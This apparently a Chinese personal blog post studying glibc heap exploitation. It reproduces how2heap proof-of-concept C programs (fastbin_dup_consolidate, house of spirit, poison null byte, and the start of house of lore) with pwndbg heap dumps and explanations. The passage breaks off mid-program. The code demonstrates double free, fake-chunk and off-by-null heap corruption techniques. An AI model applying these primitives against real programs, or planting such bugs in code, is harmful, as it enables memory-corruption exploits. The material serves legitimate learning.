<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="how2heap(持续更新ing）, StarrySky">
    <meta name="description" content="Love rises from the east and descends to the west,romance makes no changes until death.">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>how2heap(持续更新ing） | StarrySky</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="StarrySky" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">StarrySky</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>主页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>文章</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>个人简介</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">StarrySky</div>
        <div class="logo-desc">
            
            Love rises from the east and descends to the west,romance makes no changes until death.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			主页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			文章
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			个人简介
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/starrysky1004" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/starrysky1004" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">how2heap(持续更新ing）</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/pwn/">
                                <span class="chip bg-color">pwn</span>
                            </a>
                        
                            <a href="/tags/heap/">
                                <span class="chip bg-color">heap</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/heap/" class="post-category">
                                heap
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-05-22
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

void main() &#123;
	void* p1 &#x3D; calloc(1,0x40);
	free(p1);

	void* p3 &#x3D; malloc(0x400);
	printf(&quot;分配一个tcache大小的堆(p3&#x3D;%p)\n&quot;, p3);
	printf(&quot;将触发 malloc_consolidate 并合并\n&quot;);
	printf(&quot;因此fastbin中的堆进入top chunk\n&quot;);
	printf(&quot;p1 和 p3 现在指向同一个堆 !\n\n&quot;);

	assert(p1 &#x3D;&#x3D; p3);

	printf(&quot;触发double free漏洞！\n\n&quot;);
	free(p1);

	void *p4 &#x3D; malloc(0x400);

	assert(p4 &#x3D;&#x3D; p3);

	printf(&quot;double free 添加了 p1 引用的 chunk \n&quot;);
	printf(&quot;到 tcache 因此下一个类似大小的 malloc 将\n&quot;);
	printf(&quot;指向 p3: p3&#x3D;%p, p4&#x3D;%p\n\n&quot;,p3, p4);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>p1</code>被释放进入<code>fastbin</code>之后创建大小属于<code>large bin</code>的堆<code>p3</code>，判断完<code>p3</code>不属于<code>fastbin</code>和<code>small bin</code>之后进行<code>malloc consolidate</code>将<code>p1</code>整理到<code>unsorted bin</code>，又被合并到<code>top chunk</code>,在申请堆<code>p3</code>时就从<code>top chunk</code>取的堆，所以<code>p3</code>和<code>p1</code>地址相同，而此时<code>chunk1</code>地址成为了<code>chunk3</code>的地址，再次释放<code>chunk1</code>释放的就是<code>chunk3</code>，再申请与<code>chunk3</code>大小相同的堆时申请到的就是<code>chunk3</code>地址，因此<code>p4 = p3</code>且两个指针都未置零，因为释放的是<code>p1</code></p>
<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
&#123;
        fprintf(stderr, &quot;This file demonstrates the house of spirit attack.\n&quot;);

        fprintf(stderr, &quot;Calling malloc() once so that it sets up its memory.\n&quot;);
        malloc(1);

        fprintf(stderr, &quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.\n&quot;);
        unsigned long long *a;
        &#x2F;&#x2F; This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

        fprintf(stderr, &quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]);

        fprintf(stderr, &quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;&#x3D; 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;);
        fprintf(stderr, &quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;);
        fake_chunks[1] &#x3D; 0x40; &#x2F;&#x2F; this is the size

        fprintf(stderr, &quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;);
        &#x2F;&#x2F; fake_chunks[9] because 0x40 &#x2F; sizeof(unsigned long long) &#x3D; 8
        fake_chunks[9] &#x3D; 0x1234; &#x2F;&#x2F; nextsize

        fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;, &amp;fake_chunks[1]);
        fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;);
        a &#x3D; &amp;fake_chunks[2];

        fprintf(stderr, &quot;Freeing the overwritten pointer.\n&quot;);
        free(a);

        fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]);
        fprintf(stderr, &quot;malloc(0x30): %p\n&quot;, malloc(0x30));
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在栈中取了一个地址布置<code>fake_chunk</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffe1b0
0x7fffffffe1b0: 0x0000000000000001      0x0000000000000040	#size
0x7fffffffe1c0: 0x00007ffff7ffe168      0x00000000000000f0
0x7fffffffe1d0: 0x00000000000000c2      0x000055555555542d
0x7fffffffe1e0: 0x00007fffffffe20e      0x0000000000000000
0x7fffffffe1f0: 0x00005555555553e0      0x0000000000001234	#next size<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>伪造成功即可释放<code>fake_chunk</code>到<code>bin</code>，其中<code>free</code>的地址是<code>user data</code>地址</p>
<h1 id="poison-null-byte-x2F-off-by-null"><a href="#poison-null-byte-x2F-off-by-null" class="headerlink" title="poison_null_byte&#x2F;off-by-null"></a>poison_null_byte&#x2F;off-by-null</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;
#include &lt;assert.h&gt;


int main()
&#123;
        setbuf(stdin, NULL);
        setbuf(stdout, NULL);

        printf(&quot;Welcome to poison null byte 2.0!\n&quot;);
        printf(&quot;Tested in Ubuntu 16.04 64bit.\n&quot;);
        printf(&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;);
        printf(&quot;This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.\n&quot;);

        uint8_t* a;
        uint8_t* b;
        uint8_t* c;
        uint8_t* b1;
        uint8_t* b2;
        uint8_t* d;
        void *barrier;

        printf(&quot;We allocate 0x100 bytes for &#39;a&#39;.\n&quot;);
        a &#x3D; (uint8_t*) malloc(0x100);
        printf(&quot;a: %p\n&quot;, a);
        int real_a_size &#x3D; malloc_usable_size(a);
        printf(&quot;Since we want to overflow &#39;a&#39;, we need to know the &#39;real&#39; size of &#39;a&#39; &quot;
                &quot;(it may be more than 0x100 because of rounding): %#x\n&quot;, real_a_size);

        &#x2F;* chunk size attribute cannot have a least significant byte with a value of 0x00.
         * the least significant byte of this will be 0x10, because the size of the chunk includes
         * the amount requested plus some amount required for the metadata. *&#x2F;
        b &#x3D; (uint8_t*) malloc(0x200);

        printf(&quot;b: %p\n&quot;, b);

        c &#x3D; (uint8_t*) malloc(0x100);
        printf(&quot;c: %p\n&quot;, c);

        barrier &#x3D;  malloc(0x100);
        printf(&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;
                &quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;, barrier);

        uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);

        &#x2F;&#x2F; added fix for size&#x3D;&#x3D;prev_size(next_chunk) check in newer versions of glibc
        &#x2F;&#x2F; https:&#x2F;&#x2F;sourceware.org&#x2F;git&#x2F;?p&#x3D;glibc.git;a&#x3D;commitdiff;h&#x3D;17f487b7afa7cd6c316040f3e6c86dc96b2eec30
        &#x2F;&#x2F; this added check requires we are allowed to have null pointers in b (not just a c string)
        &#x2F;&#x2F;*(size_t*)(b+0x1f0) &#x3D; 0x200;
        printf(&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;
                &quot;the check &#39;chunksize(P) !&#x3D; prev_size (next_chunk(P))&#39;\n&quot;);
        &#x2F;&#x2F; we set this location to 0x200 since 0x200 &#x3D;&#x3D; (0x211 &amp; 0xff00)
        &#x2F;&#x2F; which is the value of b.size after its first byte has been overwritten with a NULL byte
        *(size_t*)(b+0x1f0) &#x3D; 0x200;

        &#x2F;&#x2F; this technique works by overwriting the size metadata of a free chunk
        free(b);

        printf(&quot;b.size: %#lx\n&quot;, *b_size_ptr);
        printf(&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;);
        printf(&quot;We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;\n&quot;);
        a[real_a_size] &#x3D; 0; &#x2F;&#x2F; &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;
        printf(&quot;b.size: %#lx\n&quot;, *b_size_ptr);

        uint64_t* c_prev_size_ptr &#x3D; ((uint64_t*)c)-2;
        printf(&quot;c.prev_size is %#lx\n&quot;,*c_prev_size_ptr);

        &#x2F;&#x2F; This malloc will result in a call to unlink on the chunk where b was.
        &#x2F;&#x2F; The added check (commit id: 17f487b), if not properly handled as we did before,
        &#x2F;&#x2F; will detect the heap corruption now.
        &#x2F;&#x2F; The check is this: chunksize(P) !&#x3D; prev_size (next_chunk(P)) where
        &#x2F;&#x2F; P &#x3D;&#x3D; b-0x10, chunksize(P) &#x3D;&#x3D; *(b-0x10+0x8) &#x3D;&#x3D; 0x200 (was 0x210 before the overflow)
        &#x2F;&#x2F; next_chunk(P) &#x3D;&#x3D; b-0x10+0x200 &#x3D;&#x3D; b+0x1f0
        &#x2F;&#x2F; prev_size (next_chunk(P)) &#x3D;&#x3D; *(b+0x1f0) &#x3D;&#x3D; 0x200
        printf(&quot;We will pass the check since chunksize(P) &#x3D;&#x3D; %#lx &#x3D;&#x3D; %#lx &#x3D;&#x3D; prev_size (next_chunk(P))\n&quot;,
                *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
        b1 &#x3D; malloc(0x100);

        printf(&quot;b1: %p\n&quot;,b1);
        printf(&quot;Now we malloc &#39;b1&#39;. It will be placed where &#39;b&#39; was. &quot;
                &quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;,*c_prev_size_ptr);
        printf(&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;
                &quot;before c.prev_size: %lx\n&quot;,*(((uint64_t*)c)-4));
        printf(&quot;We malloc &#39;b2&#39;, our &#39;victim&#39; chunk.\n&quot;);
        &#x2F;&#x2F; Typically b2 (the victim) will be a structure with valuable pointers that we want to control

        b2 &#x3D; malloc(0x80);
        printf(&quot;b2: %p\n&quot;,b2);

        memset(b2,&#39;B&#39;,0x80);
        printf(&quot;Current b2 content:\n%s\n&quot;,b2);

        printf(&quot;Now we free &#39;b1&#39; and &#39;c&#39;: this will consolidate the chunks &#39;b1&#39; and &#39;c&#39; (forgetting about &#39;b2&#39;).\n&quot;);

        free(b1);
        free(c);

        printf(&quot;Finally, we allocate &#39;d&#39;, overlapping &#39;b2&#39;.\n&quot;);
        d &#x3D; malloc(0x300);
        printf(&quot;d: %p\n&quot;,d);

        printf(&quot;Now &#39;d&#39; and &#39;b2&#39; overlap.\n&quot;);
        memset(d,&#39;D&#39;,0x300);

        printf(&quot;New b2 content:\n%s\n&quot;,b2);

        printf(&quot;Thanks to https:&#x2F;&#x2F;www.contextis.com&#x2F;resources&#x2F;white-papers&#x2F;glibc-adventures-the-forgotten-chunks&quot;
                &quot;for the clear explanation of this technique.\n&quot;);

        assert(strstr(b2, &quot;DDDDDDDDDDDD&quot;));
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>条件</strong>：没有<code>tcache</code>且有<code>off-by-one</code>漏洞</p>
<p>首先创建了四个堆，其中<code>barrier</code>是为了防止释放<code>c</code>时与<code>top chunk</code>合并</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000			#a
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555c110			#b
Size: 0x211

Allocated chunk | PREV_INUSE
Addr: 0x55555555c320			#c
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555c430			#barrier
Size: 0x111

Top chunk | PREV_INUSE
Addr: 0x55555555c540
Size: 0x20ac1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将堆<code>b</code>的末尾伪造成<code>next_chunk</code>的<code>prev_size</code>，使得通过<code>off-by-null</code>修改<code>b</code>的<code>size</code>的后两位为<code>0</code>之后依然能够绕过<code>size = prve_size(next_chunk)</code></p>
<pre class="line-numbers language-none"><code class="language-none">0x55555555c310: 0x0000000000000200      0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>释放堆<code>b</code>并通过<code>off-by-null</code>将<code>b</code>的大小改成<code>0x200</code>，此时<code>c</code>被识别到伪造的<code>next_chunk</code>处，由于没有修改<code>size</code>位所以<code>size</code>为<code>0</code>，但已经绕过了检查</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000
Size: 0x111

Free chunk (unsortedbin)
Addr: 0x55555555c110
Size: 0x200
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555c310
Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>0x100</code>的堆<code>b1</code>和一个<code>0x80</code>的堆<code>b2</code>,此时堆从<code>unsorted bin</code>中分割，地址在刚刚释放的<code>b</code>处</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555c110
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555c220
Size: 0x91

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555c2b0
Size: 0x61
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555c310
Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>且真实的<code>c</code>的<code>prve_size</code>没有更新，而是更新了伪造的<code>prve_size</code></p>
<pre class="line-numbers language-none"><code class="language-none">0x55555555c310: 0x0000000000000060      0x0000000000000000
0x55555555c320: 0x0000000000000210      0x0000000000000110<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>此时释放<code>b1</code>和<code>c</code>，会将<code>b1</code>和<code>c</code>合并成一个覆盖<code>b2</code>的堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000
Size: 0x111

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555c110
Size: 0x321
fd: 0x55555555c2b0
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555c430
Size: 0x110

Top chunk | PREV_INUSE
Addr: 0x55555555c540
Size: 0x20ac1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时将合并的堆申请出来就能实现<code>overlap</code>，即申请的空间覆盖了<code>b2</code></p>
<h1 id="house-of-lore-x2F-small-bin"><a href="#house-of-lore-x2F-small-bin" class="headerlink" title="house_of_lore&#x2F;small bin"></a>house_of_lore&#x2F;small bin</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.
[ ... ]
else
    &#123;
      bck &#x3D; victim-&gt;bk;
    if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))&#123;
                  errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;
                  goto errout;
                &#125;
       set_inuse_bit_at_offset (victim, nb);
       bin-&gt;bk &#x3D; bck;
       bck-&gt;fd &#x3D; bin;
       [ ... ]
*&#x2F;

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\n&quot;); exit(0); &#125;

int main(int argc, char * argv[])&#123;


  intptr_t* stack_buffer_1[4] &#x3D; &#123;0&#125;;
  intptr_t* stack_buffer_2[3] &#x3D; &#123;0&#125;;

  fprintf(stderr, &quot;\nWelcome to the House of Lore\n&quot;);
  fprintf(stderr, &quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;);
  fprintf(stderr, &quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;);

  fprintf(stderr, &quot;Allocating the victim chunk\n&quot;);
  intptr_t *victim &#x3D; malloc(0x100);
  fprintf(stderr, &quot;Allocated the first small chunk on the heap at %p\n&quot;, victim);

  &#x2F;&#x2F; victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk &#x3D; victim-2;

  fprintf(stderr, &quot;stack_buffer_1 at %p\n&quot;, (void*)stack_buffer_1);
  fprintf(stderr, &quot;stack_buffer_2 at %p\n&quot;, (void*)stack_buffer_2);

  fprintf(stderr, &quot;Create a fake chunk on the stack\n&quot;);
  fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;
         &quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;);
  stack_buffer_1[0] &#x3D; 0;
  stack_buffer_1[1] &#x3D; 0;
  stack_buffer_1[2] &#x3D; victim_chunk;

  fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;
         &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;
         &quot;chunk on stack&quot;);
  stack_buffer_1[3] &#x3D; (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] &#x3D; (intptr_t*)stack_buffer_1;
  
  fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;
